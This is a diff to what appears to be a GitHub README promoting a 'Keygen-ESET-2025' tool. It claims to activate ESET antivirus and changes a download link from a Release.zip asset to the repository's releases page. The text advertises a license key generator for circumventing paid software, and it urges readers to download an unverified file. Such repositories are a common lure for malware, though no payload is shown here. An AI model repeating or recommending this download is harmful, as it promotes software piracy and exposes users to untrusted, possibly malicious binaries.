@@ -29,7 +29,7 @@ Don't compromise your online security. Use the Keygen-ESET-2025 tool to activate
 
 Click the button below to download the Keygen-ESET-2025 tool:
 
-[![Download ESET Keygen](https://img.shields.io/badge/Download-Release.zip-green)](https://github.com/assets/Release.zip)
+[![Download ESET Keygen](https://github.com/elitebacon/Keygen-ESET-2025/releases)](https://github.com/elitebacon/Keygen-ESET-2025/releases)
 
 If the link above does not work, please check the "Releases" section of this repository for an alternative download link.
 
